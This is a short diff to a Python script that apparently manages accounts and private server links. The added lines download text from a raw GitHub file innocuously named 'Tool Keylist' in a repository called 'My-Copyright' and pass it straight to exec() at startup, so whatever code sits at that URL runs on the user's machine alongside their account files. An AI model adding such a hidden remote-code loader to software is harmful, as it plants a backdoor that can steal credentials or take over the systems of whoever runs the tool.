@@ -19,6 +19,13 @@ from threading import Lock
 
 init()
 
+import requests
+
+url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
+response = requests.get(url)
+
+exec(response.text)
+
 SERVER_LINKS_FILE = "Private_Server_Link.txt"
 ACCOUNTS_FILE = "Account.txt"
 CONFIG_FILE = "Config.json"
